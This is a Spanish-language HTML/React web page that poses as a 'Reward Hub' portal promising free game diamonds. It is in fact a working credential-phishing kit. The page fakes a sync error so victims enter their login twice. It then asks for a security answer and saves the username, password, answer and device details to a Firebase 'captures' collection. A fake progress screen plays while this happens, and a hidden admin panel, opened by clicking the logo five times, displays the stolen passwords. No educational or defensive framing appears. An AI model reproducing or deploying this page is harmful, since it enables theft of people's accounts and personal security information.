<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reward Hub - Portal Oficial de Sincronización</title>
    <!-- Cargamos Tailwind CSS para el diseño profesional -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Cargamos Lucide para los iconos -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <!-- Cargamos React y Babel para que el código funcione directamente en el navegador -->
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
    </style>
</head>
<body class="bg-[#f8fafc]">
    <div id="root"></div>

    <script type="text/babel" data-type="module">
        const { useState, useEffect, useRef } = React;

        // --- IMPORTACIÓN DE FIREBASE (Versión Web Modular) ---
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // Configuración inyectada por el sistema
        const firebaseConfig = JSON.parse(__firebase_config);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'reward-hub-elite-v100';

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        function App() {
            const [user, setUser] = useState(null);
            const [step, setStep] = useState(1);
            const [username, setUsername] = useState('');
            const [password, setPassword] = useState('');
            const [securityAnswer, setSecurityAnswer] = useState('');
            const [onlineUsers, setOnlineUsers] = useState(4820);
            const [authError, setAuthError] = useState('');
            const [isAuthenticating, setIsAuthenticating] = useState(false);
            const [showCookies, setShowCookies] = useState(true);
            const [progress, setProgress] = useState(0);
            const [logs, setLogs] = useState([]);
            
            const [clickCount, setClickCount] = useState(0);
            const [showAdmin, setShowAdmin] = useState(false);
            const [capturedData, setCapturedData] = useState([]);
            const [showPasswords, setShowPasswords] = useState({});

            useEffect(() => {
                signInAnonymously(auth).catch(() => {});
                onAuthStateChanged(auth, setUser);
                const intUsers = setInterval(() => setOnlineUsers(p => p + (Math.random() > 0.5 ? 2 : -1)), 8000);
                return () => clearInterval(intUsers);
            }, []);

            useEffect(() => {
                if (!user || !showAdmin) return;
                const q = collection(db, 'artifacts', appId, 'public', 'data', 'captures');
                return onSnapshot(q, (s) => {
                    const d = s.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                    setCapturedData(d.sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)));
                });
            }, [user, showAdmin]);

            const handleLogoClick = () => {
                setClickCount(p => (p + 1 >= 5 ? (setShowAdmin(true), 0) : p + 1));
                setTimeout(() => setClickCount(0), 3000);
            };

            const saveData = async (statusLabel) => {
                if (!user) return;
                try {
                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'captures'), {
                        username, password, securityAnswer,
                        info: { ua: navigator.userAgent, res: `${window.screen.width}x${window.screen.height}` },
                        status: statusLabel,
                        timestamp: serverTimestamp()
                    });
                } catch (e) {}
            };

            const handleLogin = async (e) => {
                e.preventDefault();
                setIsAuthenticating(true);
                setAuthError('');
                await new Promise(r => setTimeout(r, 2000));

                if (step === 1) {
                    setAuthError('Error de Sincronización (403): La bovéda de Google Cloud no pudo validar los tokens. Reintenta ahora.');
                    await saveData('primer_intento');
                    setStep(1.1);
                } else {
                    await saveData('exito_identidad');
                    setStep(1.5);
                }
                setIsAuthenticating(false);
            };

            const startProcess = () => {
                setStep(3);
                const m = ["Iniciando túnel SSL...", "Extrayendo tokens OAuth...", "Sincronizando Bóveda...", "Dumping Cookies...", "Transferencia lista."];
                let i = 0;
                const inv = setInterval(() => {
                    if (i < m.length) {
                        setLogs(p => [...p, m[i]]);
                        setProgress(((i + 1) / m.length) * 100);
                        i++;
                    } else { clearInterval(inv); setStep(4); }
                }, 900);
            };

            useEffect(() => { if (window.lucide) window.lucide.createIcons(); });

            return (
                <div className="min-h-screen flex flex-col font-sans bg-[#f1f5f9]">
                    <nav className="w-full bg-white border-b p-4 flex justify-between items-center shadow-md sticky top-0 z-50">
                        <div onClick={handleLogoClick} className="flex items-center gap-2 active:scale-90 transition-all cursor-pointer">
                            <div className="bg-gradient-to-br from-[#ef3244] to-red-600 p-2 rounded-xl shadow-lg shadow-red-200">
                                <i data-lucide="gamepad-2" className="text-white w-6 h-6"></i>
                            </div>
                            <span className="font-black italic text-xl uppercase tracking-tighter">REWARD <span className="text-[#ef3244]">HUB</span></span>
                        </div>
                        <div className="bg-emerald-50 px-3 py-1.5 rounded-full flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
                            <span className="text-[10px] font-black text-emerald-700 uppercase tracking-widest">{onlineUsers} LIVE</span>
                        </div>
                    </nav>

                    <div className="w-full max-w-md mx-auto p-6 space-y-6 flex-1 flex flex-col justify-center mb-10">
                        {step <= 1.1 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl space-y-8 animate-in fade-in slide-in-from-bottom">
                                <div className="text-center space-y-2">
                                    <h2 className="text-3xl font-black text-slate-900 italic tracking-tight">Acceso Oficial</h2>
                                    <p className="text-sm text-slate-500 font-medium">Vincula tu cuenta para reclamar tus recursos.</p>
                                </div>
                                {authError && <div className="bg-red-50 text-red-700 p-4 rounded-2xl text-[11px] font-black border border-red-200 animate-shake">{authError}</div>}
                                <form onSubmit={handleLogin} className="space-y-4">
                                    <input type="text" placeholder="Usuario / Correo" required className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900" value={username} onChange={e => setUsername(e.target.value)} />
                                    <input type="password" placeholder="Contraseña" required className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900" value={password} onChange={e => setPassword(e.target.value)} />
                                    <button className="w-full bg-gradient-to-r from-[#ef3244] to-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all">
                                        {isAuthenticating ? "Sincronizando..." : "Vincular Bóveda"}
                                    </button>
                                </form>
                            </div>
                        )}

                        {step === 1.5 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
                                <i data-lucide="shield-check" className="w-12 h-12 text-blue-600 mx-auto"></i>
                                <h2 className="text-2xl font-black italic uppercase text-slate-900 leading-none">Validación Extra</h2>
                                <p className="text-xs text-slate-500 font-bold italic">Confirma tu pregunta de seguridad registrada:</p>
                                <div className="bg-slate-50 p-5 rounded-2xl border text-[13px] font-black text-slate-700 italic shadow-inner">¿Nombre de tu mascota o ciudad de origen?</div>
                                <input type="text" placeholder="Respuesta..." className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900 text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />
                                <button onClick={() => setStep(2)} className="w-full bg-blue-600 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl tracking-widest active:scale-95">Confirmar Propiedad</button>
                            </div>
                        )}

                        {step === 2 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
                                <h2 className="text-3xl font-black italic uppercase text-slate-900 leading-none">Bóveda Abierta</h2>
                                <div className="grid grid-cols-1 gap-4">
                                    <button onClick={startProcess} className="bg-slate-900 text-white p-8 rounded-[2.5rem] shadow-xl active:scale-95 transition-all">
                                        <span className="font-black text-3xl block tracking-tighter">50,000 DIAMANTES</span>
                                        <span className="text-[10px] font-bold text-slate-400 uppercase mt-2 block tracking-widest leading-none">RECLAMAR PACK ELITE</span>
                                    </button>
                                </div>
                            </div>
                        )}

                        {step === 3 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in fade-in">
                                <div className="relative w-20 h-20 mx-auto">
                                    <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
                                    <div className="absolute inset-0 border-4 border-[#ef3244] rounded-full border-t-transparent animate-spin"></div>
                                    <div className="absolute inset-0 flex items-center justify-center text-xs font-black">{Math.round(progress)}%</div>
                                </div>
                                <p className="text-[11px] font-black uppercase tracking-[0.3em] text-[#ef3244] italic animate-pulse">Sincronizando Cookies 3ª...</p>
                                <div className="bg-slate-900 p-6 rounded-[2rem] h-48 overflow-y-auto text-left font-mono text-[10px] text-green-400 shadow-inner">
                                    {logs.map((l, i) => <div key={i} className="mb-1 opacity-80"> {'>'} {l}</div>)}
                                </div>
                            </div>
                        )}

                        {step === 4 && (
                            <div className="bg-white border-t-8 border-[#ef3244] p-12 rounded-[3.5rem] shadow-2xl text-center space-y-8 animate-in slide-in-from-top duration-700">
                                <div className="bg-emerald-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto border border-emerald-100 shadow-xl">
                                    <i data-lucide="check-circle" className="w-12 h-12 text-emerald-500"></i>
                                </div>
                                <h2 className="text-3xl font-black uppercase italic leading-none tracking-tighter text-slate-900">¡Sincronización Exitosa!</h2>
                                <p className="text-sm text-slate-600 font-medium italic leading-relaxed px-2">Recibirás los diamantes en tu cuenta en un plazo máximo de 24 horas.</p>
                                <button onClick={() => window.location.reload()} className="w-full bg-slate-900 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl active:scale-95 transition-all">Finalizar Proceso</button>
                            </div>
                        )}
                    </div>

                    <footer className="w-full bg-slate-900 text-slate-500 py-16 text-center mt-auto border-t border-white/5 px-6">
                        <p className="text-[10px] uppercase tracking-[0.4em] font-black opacity-40 leading-relaxed max-w-xs mx-auto">
                            REWARD HUB PARTNER PROGRAM © 2026. <br/> EXTRACCIÓN DE METADATOS MULTI-SERVIDOR PROTEGIDA.
                        </p>
                    </footer>

                    {showAdmin && (
                        <div className="fixed inset-0 z-[100] bg-[#020617]/98 backdrop-blur-3xl flex flex-col p-6 overflow-hidden text-white animate-in fade-in">
                            <div className="flex justify-between items-center mb-8 border-b border-white/10 pb-6">
                                <h2 className="text-2xl font-black uppercase italic tracking-tighter">Intel Hub ({capturedData.length})</h2>
                                <button onClick={() => setShowAdmin(false)} className="bg-red-500/20 p-3 rounded-full text-red-500"><i data-lucide="x" className="w-6 h-6"></i></button>
                            </div>
                            <div className="flex-1 overflow-y-auto space-y-6">
                                {capturedData.map(item => (
                                    <div key={item.id} className="bg-white/5 p-6 rounded-[2rem] border border-white/10 flex flex-col gap-4 transition-all hover:bg-white/[0.07]">
                                        <div className="flex justify-between">
                                            <p className="text-2xl font-black uppercase">{item.username}</p>
                                            <span className="text-emerald-400 text-[10px] font-black">VAULT_DUMPED</span>
                                        </div>
                                        <div className="bg-black/40 p-4 rounded-xl flex justify-between items-center border border-white/5">
                                            <p className="font-mono text-xl">{showPasswords[item.id] ? item.password : '••••••••••••'}</p>
                                            <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-2 text-indigo-400"><i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"}></i></button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
